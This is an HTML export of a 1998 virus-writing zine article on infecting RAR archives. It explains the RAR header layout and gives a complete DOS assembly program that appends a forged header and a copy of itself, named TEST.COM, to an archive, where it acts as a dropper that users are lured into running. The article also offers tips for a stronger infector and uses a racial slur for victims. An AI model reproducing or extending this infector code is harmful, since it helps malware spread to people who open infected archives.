<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #3 - Phile 110 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;                          Dropping over RAR archives</span><span class="sc0">
</span><span class="sc1">;                       From the Archives infector series</span><span class="sc0">
</span><span class="sc1">;                 by UnknowN Mnemonik(alias StarZer0 on irc)/iKx</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Intro</span><span class="sc0">
</span><span class="sc1">;  +-----+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  rar is very common in  the  warez  world , aproximately 75% of warez are</span><span class="sc0">
</span><span class="sc1">;  archived  with rar , rar are quite easy infect , they don't need complex</span><span class="sc0">
</span><span class="sc1">;  manipulation  and can  be  easily infected with 100 bytes of code , good</span><span class="sc0">
</span><span class="sc1">;  news no ? Ok let's infect them</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The rar files structure</span><span class="sc0">
</span><span class="sc1">;  +-----------------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The header is small and it is the only one thing that need to be changed,</span><span class="sc0">
</span><span class="sc1">;  lets see how it's built , like in arj he have a header CRC , but no probs</span><span class="sc0">
</span><span class="sc1">;  virus coder destroy all protections once more .</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  There's no header signature ( bizarre mmm ? )</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Name                    Type                  Value</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; OFFSET LABEL       TYP  VALUE        DESCRIPTION</span><span class="sc0">
</span><span class="sc1">; ------ ----------- ---- ----------- ----------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 00     HEAD_CRC    DW   0000         Low part of the CRC header</span><span class="sc0">
</span><span class="sc1">; 02     HEAD_TYPE   DB   00           Block type </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Value: 72h = Marker block       73h = Archive header</span><span class="sc0">
</span><span class="sc1">;                74h = File header        75h = Comment header</span><span class="sc0">
</span><span class="sc1">;                76h = extra information  77h = subblock</span><span class="sc0">
</span><span class="sc1">;                78h = recovery record</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 03     HEAD_FLAGS  DW   0000         Block size</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Value: 4000h = old archive type , Ignored by older version</span><span class="sc0">
</span><span class="sc1">;                8000h = if set, ADD_SIZE field is present</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 05     (ADDSIZE)   DW   0000         Optional - added block if file block</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 07     RARCOMPSS   HEX  00000000     Compressed size</span><span class="sc0">
</span><span class="sc1">; 0B     RARUNCMPS   HEX  00000000     Uncompressed size</span><span class="sc0">
</span><span class="sc1">; 0F     HOSTOS      DB   00           Host operating system</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Value:   0 = MS DOS             2 - WIN32</span><span class="sc0">
</span><span class="sc1">;                  1 = OS/2               3 - UNIX</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 10     CRC32       HEX  00000000     CRC32 of the original file</span><span class="sc0">
</span><span class="sc1">; 14     FILETIME    DW   0000         File time , msdos format</span><span class="sc0">
</span><span class="sc1">; 16     FILEDATE    DW   0000         File date , msdos format</span><span class="sc0">
</span><span class="sc1">; 18     VERNEED     DB   0            Version need to extract</span><span class="sc0">
</span><span class="sc1">; 19     METHODCMP   DB   0            Compression method</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;         Value:  0x30 - storing                  0x33 - normal compression</span><span class="sc0">
</span><span class="sc1">;                 0x31 - fastest compression      0x34 - good compression</span><span class="sc0">
</span><span class="sc1">;                 0x32 - fast compression         0x35 - best compression</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 1A     NAMELENGTH  DB   0            File name length</span><span class="sc0">
</span><span class="sc1">; 1B     ATTRIB      DW   0            Rar attribute</span><span class="sc0">
</span><span class="sc1">; 1D     FILENAME    DS   ?            Filename</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Infection</span><span class="sc0">
</span><span class="sc1">;  +----------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  I use the worst method for infection : THE DROPPER, it uses the stupidity</span><span class="sc0">
</span><span class="sc1">;  of some niggas under dos ( like a lot of poeple ) who see a .com and want</span><span class="sc0">
</span><span class="sc1">;  run it , this little com file is saying : Hey man ,  I'm here !!! run me,</span><span class="sc0">
</span><span class="sc1">;  run me, I have a suprise for you ( hehehe ) ,this method is also the best</span><span class="sc0">
</span><span class="sc1">;  to call niggas with their debugger  to disassemble it , anyway , it's the</span><span class="sc0">
</span><span class="sc1">;  more easy way of infection , waiting for progression </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Algorithm</span><span class="sc0">
</span><span class="sc1">;    +-----------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  1ø Open the file</span><span class="sc0">
</span><span class="sc1">;  2ø Go to the end</span><span class="sc0">
</span><span class="sc1">;  3ø Calculate the Crc32 of the virus</span><span class="sc0">
</span><span class="sc1">;  4ø Calculate the Crc of the header</span><span class="sc0">
</span><span class="sc1">;  5ø Write the header</span><span class="sc0">
</span><span class="sc1">;  6ø Write the virus</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;      Usefull code</span><span class="sc0">
</span><span class="sc1">;    +--------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  To prove that it does WORK, I have included here some usefull code you can</span><span class="sc0">
</span><span class="sc1">;  use and analyse , anyway , rar infection is too easy , test this with  RAR</span><span class="sc0">
</span><span class="sc1">;  2.0 or upper and a TEST.RAR present  in the  same directory of the program,</span><span class="sc0">
</span><span class="sc1">;  compile the code with TASM/TLINK</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; --------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                                    </span><span class="sc1">; open the file </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">                          </span><span class="sc1">; change name with you RAR </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; file</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                      </span><span class="sc1">; phucky handle bug</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                                    </span><span class="sc1">; go to the end</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_calc</span><span class="sc0">                                   </span><span class="sc1">; get the CRC of this prog</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RarCrc32</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; save it into RarCRC32</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RarCrc32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FinRarHeader</span><span class="sc4">-</span><span class="sc5">Rartype</span><span class="sc0">                     </span><span class="sc1">; Get the Crc of the </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RarType</span><span class="sc0">                           </span><span class="sc1">; header</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_calc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RarHeaderCrc</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; save low word in</span><span class="sc0">
                                                </span><span class="sc1">; RarHeaderCrc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; write the header!</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FinRarHeader</span><span class="sc4">-</span><span class="sc5">RarHeader</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RarHeader</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RarCrc32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; clean all the RARCRC32</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RarCrc32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RarHeaderCrc</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; write this code</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                                      </span><span class="sc1">; it's finish close the </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; file</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_calc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_table</span><span class="sc0">              </span><span class="sc1">; render crc table</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Crc_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Crc_loop</span><span class="sc0">

</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">starttable</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc0">    </span><span class="sc1">; the buffer table</span><span class="sc0">
                    </span><span class="sc1">; remember : It begin by the end</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">               </span><span class="sc1">; set bp equal 255 </span><span class="sc0">
                    </span><span class="sc1">; 255 * 4 = 1024</span><span class="sc0">
</span><span class="sc6">std</span><span class="sc0">                 </span><span class="sc1">; set Direction Flag On</span><span class="sc0">
                    
</span><span class="sc5">TableHighloop</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; the major loop in the Crc table</span><span class="sc0">
                                        </span><span class="sc1">; Calc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; set the minus loop to 8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; dx = bp , major counter loop</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; ax = zero</span><span class="sc0">

</span><span class="sc5">TableLowLoop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; mov one byte of ax at right in</span><span class="sc0">
                                        </span><span class="sc1">; bin</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; if anything losted , put it on</span><span class="sc0">
                                        </span><span class="sc1">; dx</span><span class="sc0">

</span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">anomality</span><span class="sc0">            </span><span class="sc1">; if superior or equal skip</span><span class="sc0">
                                        </span><span class="sc1">; encrypt.</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">            </span><span class="sc1">; encrypt value by a signature</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">anomality</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">TableLowLoop</span><span class="sc0">         </span><span class="sc1">; make it 8 times</span><span class="sc0">

</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; write ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; not write dx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; decrement the counter</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TableHighLoop</span><span class="sc0">           </span><span class="sc1">; repeat it until bp = 0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; last value equal 0</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">; clear direction flag          </span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">filename</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'test.rar'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RarHeader</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">RarHeaderCrc</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc0">
</span><span class="sc5">RarType</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
</span><span class="sc5">RarFlags</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">
</span><span class="sc5">RarHeadsize</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">FinRarHeader</span><span class="sc4">-</span><span class="sc5">RarHeader</span><span class="sc0">
</span><span class="sc5">RarCompressed</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">Fin</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
</span><span class="sc5">RarOriginal</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">Fin</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
</span><span class="sc5">RarOs</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RarCrc32</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">RarFileTime</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc0">                   </span><span class="sc1">; random...</span><span class="sc0">
</span><span class="sc5">RarFileDate</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc0">
</span><span class="sc5">RarNeedVer</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc0">
</span><span class="sc5">RarMethod</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc0">
</span><span class="sc5">RarFnameSize</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">FinRarHeader</span><span class="sc4">-</span><span class="sc5">RarName</span><span class="sc0">
</span><span class="sc5">RarAttrib</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RarName</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TEST.COM'</span><span class="sc0">

</span><span class="sc5">FinRarHeader</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">starttable</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Wanna build a good RAR infector ? Errrm as usual , a VXD is the best thing</span><span class="sc0">
</span><span class="sc1">;  to  do , otherwise ,  there are minor things to upgrade , RAR infection is</span><span class="sc0">
</span><span class="sc1">;  easy  as com  infector , try also  to use an existing header in a real RAR </span><span class="sc0">
</span><span class="sc1">;  file</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Les petits D‚linquants (R)(C)(TM) [StarZero'98]</span><span class="sc0">
</span><span class="sc1">; </span></div></body>
</html>
